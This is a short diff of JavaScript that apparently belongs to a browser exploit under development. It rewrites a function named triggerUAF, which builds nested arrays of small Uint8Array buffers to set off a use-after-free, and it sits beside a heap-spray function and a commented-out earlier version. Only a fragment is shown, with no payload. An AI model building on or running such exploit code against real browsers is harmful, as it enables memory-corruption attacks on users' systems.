@@ -56,15 +56,26 @@ function spray(count, size) {
 }
 function triggerUAF(depth) {
  
-  const root = [];
+  let root = [];
+ 
   let cur = root;
+
   for (let i = 0; i < depth; i++) {
-    const v = new Uint8Array(0x20);
-    cur.push(v);
-    cur = v;    
+ 
+    const buffer = new Uint8Array(0x20);
+    buffer[0] = 0x99;   
+    const arrayFiglio = [];
+
+ 
+    cur.push([ buffer, arrayFiglio ]);
+
+  
+    cur = arrayFiglio;
   }
+
   return root;
 }
+
 
 /*function triggerUAF(depth) {
   let root = new Map();
